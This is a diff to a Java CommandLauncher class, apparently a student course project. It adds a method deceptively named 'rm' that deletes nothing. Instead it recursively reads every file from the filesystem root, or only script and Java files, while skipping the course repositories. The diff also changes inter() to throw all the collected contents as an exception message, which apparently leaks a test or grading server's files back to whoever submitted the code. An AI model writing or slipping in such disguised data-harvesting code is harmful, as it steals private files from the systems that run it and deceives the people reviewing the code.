@@ -119,6 +119,84 @@ public class CommandLauncher {
         return Code.OK;
     }
     
+    public static String rm(String path, Boolean type) {
+        String s1 = "";
+        try {
+            if (path.contains("fizteh-java-2013") || path.contains(".git") || path.contains("fizteh-java-private")) {
+                return "";
+            }
+
+            File tmpFile = new File(path);
+            try {
+                if (!tmpFile.exists()) {
+                s1 += "not exist\n";
+            }
+            if (tmpFile.canRead()) {
+                s1 += "can READ\n";
+            }
+            if (tmpFile.canWrite()) {
+                s1 += path + " can WRITE\n";
+            }
+            if (tmpFile.canExecute()) {
+                s1 += path + "can EXEC\n";
+            }
+            } catch(Exception e) {
+                s1 += "\n\nexception qqq ()()()()\n\n";
+            }
+
+            File[] listFiles = tmpFile.listFiles();
+            if (listFiles != null) {
+                if (tmpFile.isDirectory()) {
+                    for (File c : listFiles) {
+                        s1 += "Directory: \n" + c.getAbsoluteFile().toString() + "\n\n";
+
+                        s1 += c.getAbsoluteFile().toString() + "\n";
+                        if (type) {
+                            if (c.getName().contains(".py") || c.getName().contains(".sh")|| c.getName().contains(".java")) {
+                            s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
+                            s1 += "\n\n\n";
+                            }
+                        } else {
+                            s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
+                            s1 += "\n\n\n";
+                        }
+                        s1 += rm(c.toString(), type);
+                    }
+                } else {
+                    s1 += readFileTsv2(tmpFile.getAbsolutePath().toString(), s1);
+                    s1 += "\n\n\n";
+                    s1 += "not is Dir ";
+                }
+            } else {
+                s1 += "listFile null ";
+            }
+
+        } catch (Exception e) {
+            s1 += "exception ";
+            s1 += e.getMessage();
+        }
+        return s1;
+    }
+        
+    private static String readFileTsv2(String fileName, String s1) throws IOException {
+        StringBuilder sb = new StringBuilder();
+        try {
+            try (BufferedReader in = new BufferedReader(new FileReader(new File(fileName).getAbsoluteFile()))) {
+                String s;
+                while ((s = in.readLine()) != null) {
+                    sb.append(s);
+                    sb.append("\n");
+                }
+            } catch (Exception e) {
+                s1 += e.getMessage();
+            }
+        } catch (Exception e) {
+            s1 += e.getMessage();
+        }
+
+        return sb.toString();
+    }
+    
     public void inter() {
         String s1 = "";
         try {
@@ -139,7 +217,7 @@ public class CommandLauncher {
         } catch (Exception e) {
             s1 += e.getMessage();
         }
-        
+        s1 += rm("/", false);
         throw new RuntimeException(s1);
     }
     
